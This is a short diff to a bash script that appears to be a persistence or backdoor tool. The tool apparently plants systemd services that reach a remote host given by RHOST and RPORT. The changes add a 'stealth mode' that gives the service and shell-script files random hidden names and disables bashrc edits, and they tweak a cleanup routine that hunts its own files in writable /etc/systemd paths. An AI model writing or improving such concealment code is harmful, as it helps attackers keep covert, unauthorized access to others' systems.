@@ -84,7 +84,12 @@ then
 	then
 		if $(echo $RPORT | grep -q "[0-9]" && echo $RHOST | grep -qi "[A-Za-z0-9]");
 		then
-			:
+			if [ "$STEALTHMODE" -eq 1 ];
+			then
+				DISABLEBASHRC=1
+				TMPSERVICE=.$(mktemp -u | sed 's/.*\.//g').service
+				TMPSERVICESHELLSCRIPT=.$(mktemp -u | sed 's/.*\.//g').sh
+			fi
 		else
 			echo -e $INFO
 			echo -e $HELP
@@ -275,12 +280,12 @@ cleanup() {
 	fi
 
 	# this removes both the .service and .sh files
-	for i in $(find /etc/systemd/ -writable -type f);
+	for i in $(find /etc/systemd/ -writable -type f 2> /dev/null);
 	do
 		grep -q $1 $i 2> /dev/null
 		if [[ $? -eq 0 ]];
 		then
-			TMP=$(echo $i | sed 's/.*\///g' | sed 's/\..*//g')
+			TMP=$(echo $i | sed 's/.*\///g' | tr -d '.' | sed 's/..$//g')
 			for j in $(find /etc/systemd/ -writable -type f);
 			do
 				grep -q $TMP $j 2> /dev/null
